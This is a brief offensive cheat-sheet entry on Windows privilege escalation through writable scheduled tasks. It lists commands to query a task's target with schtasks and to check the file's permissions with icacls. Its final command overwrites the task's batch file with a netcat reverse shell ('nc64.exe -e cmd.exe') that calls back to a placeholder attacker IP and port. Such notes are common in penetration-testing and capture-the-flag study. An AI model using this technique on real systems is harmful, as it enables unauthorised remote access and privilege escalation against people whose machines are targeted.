# Scheduled Tasks

Find a service details and look for the `Task To Run:` field.

```bash
schtasks /query /tn vulntask /fo list /v
```

Check access on the task file (F = full access)

```bash
icacls c:\path\to\the\task\file.bat
```

Override with a reverse shell

```bash
echo 'c:\path\to\nc64.exe -e cmd.exe $ATTACKER_IP $ATTACKER_PORT' > c:\path\to\the\task\file.bat
```

